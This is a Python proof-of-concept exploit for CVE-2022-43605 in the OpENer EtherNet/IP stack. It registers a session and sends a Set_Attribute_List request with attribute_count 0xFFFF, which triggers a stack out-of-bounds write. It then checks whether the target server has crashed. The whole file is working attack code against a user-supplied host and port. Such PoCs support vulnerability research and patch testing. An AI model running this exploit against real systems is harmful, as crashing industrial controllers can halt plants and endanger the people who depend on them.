#!/usr/bin/env python3
"""
PoC for OpENer CVE-2022-43605 (TALOS-2022-1662) - SetAttributeList stack OOB write.

Identical reach path to CVE-2022-43604 but exercises the sibling sink
SetAttributeList() (source/src/cip/cipcommon.c, service 0x04). The same
unchecked attribute_count_request from the wire drives the response-write loop
into the 512-byte stack ENIPMessage buffer -> stack-buffer-overflow / ASan abort.

  1. RegisterSession
  2. SendRRData -> unconnected MessageRouter request:
       service 0x04 (Set_Attribute_List), EPATH class 0x01 instance 1,
       attribute_count = 0xFFFF
"""
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 44818

ENCAP_HDR = struct.Struct("<HHIIQI")


def encap(cmd, session, payload=b""):
    return ENCAP_HDR.pack(cmd, len(payload), session, 0, 0, 0) + payload


def register_session(s):
    s.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0)))
    resp = s.recv(4096)
    if len(resp) < 24:
        raise RuntimeError("short RegisterSession response")
    return struct.unpack_from("<I", resp, 4)[0]


def build_cip_set_attribute_list(attribute_count):
    service = 0x04  # Set_Attribute_List
    epath = bytes([0x20, 0x01, 0x24, 0x01])  # class 0x01 (Identity), instance 1
    req = bytes([service, len(epath) // 2]) + epath
    req += struct.pack("<H", attribute_count)
    req += struct.pack("<H", 0x0001)  # one token attribute id
    return req


def build_send_rr_data(cip_request):
    cpf = struct.pack("<IH", 0, 0)                       # interface handle UDINT + timeout UINT
    cpf += struct.pack("<H", 2)                          # item count
    cpf += struct.pack("<HH", 0x0000, 0)                 # null address item
    cpf += struct.pack("<HH", 0x00B2, len(cip_request))  # unconnected data item
    cpf += cip_request
    return cpf


def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    session = register_session(s)
    print(f"[*] RegisterSession OK, session=0x{session:08x}")

    payload = build_send_rr_data(build_cip_set_attribute_list(0xFFFF))
    s.sendall(encap(0x006F, session, payload))
    print(f"[*] Sent Set_Attribute_List, attribute_count=0xFFFF ({len(payload)} bytes CPF)")

    try:
        data = s.recv(4096)
        print(f"[*] Server replied {len(data)} bytes (no crash yet)")
    except (socket.timeout, ConnectionResetError, OSError) as e:
        print(f"[+] Connection dropped/reset ({e}) - server likely crashed")

    time.sleep(0.5)
    try:
        s2 = socket.create_connection((HOST, PORT), timeout=2)
        s2.close()
        print("[-] Server still accepting connections")
    except OSError:
        print("[+] Server no longer accepting connections - CRASH confirmed")


if __name__ == "__main__":
    main()
